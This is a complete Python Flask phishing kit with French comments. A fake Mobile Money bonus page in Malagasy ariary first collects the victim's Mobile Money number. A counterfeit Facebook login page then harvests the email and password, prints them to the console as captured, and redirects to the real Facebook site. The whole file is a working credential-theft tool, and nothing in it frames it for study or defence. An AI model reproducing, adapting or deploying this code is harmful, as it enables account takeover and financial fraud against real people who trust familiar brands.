import os
from flask import Flask, request, redirect, render_template_string

app = Flask(__name__)

# --- INTERFACE 1 : L'APPÂT (Mobile Money) ---
HTML_PROMO = '''
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: Arial, sans-serif; background-color: #f4f4f4; display: flex; flex-direction: column; align-items: center; padding: 20px; }
        .promo-box { width: 90%; max-width: 400px; background: white; padding: 20px; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); text-align: center; }
        h2 { color: #2ecc71; }
        p { color: #555; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background-color: #2ecc71; color: white; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>
    <div class="promo-box">
        <h2>Félicitations ! 🎁</h2>
        <p>Vous avez été sélectionné pour recevoir un bonus de <b>5 000 MGA</b> via Mobile Money.</p>
        <form action="/collect_momo" method="post">
            <input type="text" name="momo_number" placeholder="Entrez votre numéro Mobile Money" required>
            <button type="submit">Réclamer mon bonus</button>
        </form>
    </div>
</body>
</html>
'''

# --- INTERFACE 2 : LA CONNEXION (Facebook) ---
HTML_FACEBOOK = '''
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; display: flex; flex-direction: column; align-items: center; margin: 0; }
        .header { width: 100%; background-color: #fff; padding: 20px 0; text-align: center; color: #1877f2; font-size: 30px; font-weight: bold; }
        .login-box { width: 90%; max-width: 400px; margin-top: 20px; text-align: center; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
        .info-msg { background: #e7f3ff; padding: 10px; border-radius: 5px; color: #0e2f56; font-size: 14px; margin-bottom: 15px; }
        input { width: 100%; padding: 15px; margin: 5px 0; border: 1px solid #dddfe2; border-radius: 6px; font-size: 16px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background-color: #1877f2; color: white; border: none; border-radius: 6px; font-size: 18px; font-weight: bold; margin-top: 10px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="header">facebook</div>
    <div class="login-box">
        <div class="info-msg">Veuillez vous connecter pour confirmer le transfert vers votre compte Mobile Money.</div>
        <form action="/login" method="post">
            <input type="text" name="email" placeholder="Mobile number or email" required>
            <input type="password" name="pass" placeholder="Password" required>
            <button type="submit">Continuer</button>
        </form>
    </div>
</body>
</html>
'''

@app.route('/')
def home():
    return HTML_PROMO

@app.route('/collect_momo', methods=['POST'])
def collect_momo():
    momo_num = request.form.get('momo_number')
    print(f"\n[+] NUMÉRO MOMO CAPTURÉ : {momo_num}")
    return HTML_FACEBOOK

@app.route('/login', methods=['POST'])
def login():
    user = request.form.get('email')
    password = request.form.get('pass')
    print(f"[!] IDENTIFIANTS CAPTURÉS")
    print(f"[+] User : {user} | Pass : {password}\n")
    return redirect("https://m.facebook.com")

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
